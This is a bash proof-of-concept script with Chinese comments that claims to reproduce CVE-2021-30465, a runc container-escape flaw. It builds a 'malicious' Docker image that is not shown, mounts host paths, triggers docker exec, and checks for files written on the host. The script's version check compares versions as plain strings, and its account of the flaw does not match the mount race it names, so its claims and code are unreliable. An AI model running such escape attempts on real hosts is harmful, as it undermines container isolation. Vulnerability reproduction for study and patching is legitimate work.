#!/bin/bash
set -e

echo "[*] CVE-2021-30465 安全复现脚本"
echo "[*] 仅在 /tmp 下操作，不会影响系统安全"

# 检查 runc 版本
RUNC_VERSION=$(runc --version | head -n1 | awk '{print $NF}')
echo "[+] 当前 runc 版本: $RUNC_VERSION"

# 提取版本号用于比较，判断当前环境是否可复现
if [[ "$RUNC_VERSION" == "1.0.0-rc95" ]] || [[ "$RUNC_VERSION" > "1.0.0-rc95" ]]; then
    echo "[-] runc 版本 >= 1.0.0-rc95，漏洞已修复，无法复现。"
    echo "    请使用 runc < 1.0.0-rc95 的环境（如 Docker 20.10.5）"
    exit 1
fi

# 创建目标目录（宿主机）
TARGET_DIR="/tmp/cve_poc_target"
sudo mkdir -p "$TARGET_DIR"
sudo chmod 777 "$TARGET_DIR"  # 允许容器写入

echo "[*] 构建恶意镜像..."
docker build -t cve-2021-30465-poc .

echo "[*] 启动攻击容器（后台运行）..."
# 挂载宿主机 /tmp 到容器 /host/tmp（只读用于解析路径）
# 挂载一个可写目录到 /mnt（将被替换为 symlink）
docker run --rm -d \
  --name cve_poc_container \
  --volume /tmp:/host/tmp:ro \
  --volume "$TARGET_DIR":/mnt \
  cve-2021-30465-poc

echo "[*] 触发 runc 写入（通过 exec 新进程）..."
# 关键：exec 会触发 runc 初始化新进程，可能写入 /dev/ptmx 等到 /mnt
# 我们希望这个写入被重定向到 /host/tmp/cve_poc_target/
timeout 5s docker exec cve_poc_container sleep 0.1 2>/dev/null || true

echo "[*] 停止容器..."
docker stop cve_poc_container >/dev/null 2>&1

echo "[*] 检查是否在宿主机 /tmp/cve_poc_target/ 下生成文件..."
if ls "$TARGET_DIR"/ 2>/dev/null | grep -q .; then
    echo "[+] SUCCESS! 漏洞复现成功！"
    echo "    文件列表："
    ls -la "$TARGET_DIR"/
else
    echo "[-] 未检测到文件。可能原因："
    echo "    1. runc 已修复"
    echo "    2. 竞争条件未命中（可多次运行）"
    echo "    3. Docker 配置限制了挂载"
fi

# 清理
echo "[*] 清理临时镜像..."
docker rmi cve-2021-30465-poc 2>/dev/null || true
sudo rm -rf "$TARGET_DIR"